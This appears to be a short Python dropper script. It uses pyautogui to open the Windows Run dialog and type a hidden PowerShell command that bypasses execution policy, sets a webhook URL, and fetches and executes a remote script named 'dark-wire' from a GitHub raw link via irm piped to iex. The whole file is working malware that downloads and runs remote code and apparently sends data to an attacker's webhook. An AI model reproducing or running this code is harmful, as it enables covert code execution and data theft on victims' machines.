import time
import sys
import subprocess
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import pyautogui
except ImportError:
    install('pyautogui')
    import pyautogui
time.sleep(0.1)
pyautogui.hotkey('win', 'r')
time.sleep(0.1)
pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/stack-crash999/Dark-Wire/refs/heads/main/dark-wire.txt?token=GHSAT0AAAAAADCA5WVLEGY54EXSVXG27NIQZ727B4A | iex")
pyautogui.press('enter')
